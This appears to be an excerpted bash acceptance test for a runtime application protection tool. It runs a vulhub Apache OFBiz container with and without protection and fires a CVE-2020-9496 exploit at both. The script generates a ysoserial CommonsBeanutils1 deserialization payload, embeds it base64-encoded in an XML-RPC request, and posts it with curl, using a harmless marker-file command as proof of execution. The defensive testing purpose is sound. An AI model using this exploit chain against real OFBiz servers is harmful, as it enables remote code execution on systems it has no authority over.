...
image="${OHMYRASP_VULHUB_OFBIZ_9496_IMAGE:-vulhub/ofbiz:17.12.01}"
baseline_name="${OHMYRASP_VULHUB_OFBIZ_9496_BASELINE_NAME:-ohmyrasp-vulhub-ofbiz9496-baseline}"
protected_name="${OHMYRASP_VULHUB_OFBIZ_9496_PROTECTED_NAME:-ohmyrasp-vulhub-ofbiz9496-protected}"
baseline_port="${OHMYRASP_VULHUB_OFBIZ_9496_BASELINE_PORT:-18462}"
protected_port="${OHMYRASP_VULHUB_OFBIZ_9496_PROTECTED_PORT:-18463}"
...
baseline_dir="logs/vulhub-ofbiz-17.12.01-9496-java8-baseline"
protected_dir="logs/vulhub-ofbiz-17.12.01-9496-java8-protected"
payload_dir="logs/vulhub-ofbiz-17.12.01-9496-java8-payload"
protected_log="${protected_dir}/events.jsonl"
marker="/tmp/ohmyrasp-ofbiz-9496-success"
...
write_payload() {
  docker run --rm --entrypoint sh \
    ...
    -w /work \
    "$image" \
    -lc "/usr/local/openjdk-8/bin/java -jar /ysoserial/ysoserial.jar CommonsBeanutils1 'touch ${marker}' > ofbiz-9496-cb1.ser && test -s ofbiz-9496-cb1.ser"
  base64 -w 0 "${payload_dir}/ofbiz-9496-cb1.ser" > "${payload_dir}/ofbiz-9496-cb1.b64"
  {
    printf '%s\n' '<?xml version="1.0"?>'
    printf '%s\n' '<methodCall>'
    ...
    cat "${payload_dir}/ofbiz-9496-cb1.b64"
    printf '%s\n' '</serializable>'
    printf '%s\n' '            </value>'
    printf '%s\n' '          </member>'
    printf '%s\n' '        </struct>'
...
post_xmlrpc() {
  ...
  curl_status "$output" \
    ...
    --data-binary "@${payload_dir}/ofbiz-9496.xml" \
...
wait_for_deserialization_block() {
  ...
  cat "$protected_log" >&2 || true
  echo "missing java8_deserialization_gadget_class block event for OFBiz CVE-2020-9496" >&2
  exit 1
}
...
verify_image_java8() {
  ...
  if ! grep -Fq '1.8.0_342' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2 || true
    echo "OFBiz CVE-2020-9496 image did not report the expected Java 8 runtime" >&2
    exit 1
  fi
}
...
run_baseline() {
  ...
  if [[ "$status" != "200" ]] || ! container_has_marker "$baseline_name"; then
    ...
    echo "baseline OFBiz CVE-2020-9496 did not create ${marker}" >&2
    exit 1
  fi
...
run_protected() {
  ...
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "OFBiz protected startup produced a detection before CVE-2020-9496 traffic" >&2
    exit 1
  fi
...
echo "vulhub OFBiz 17.12.01 CVE-2020-9496 Java8 acceptance passed"
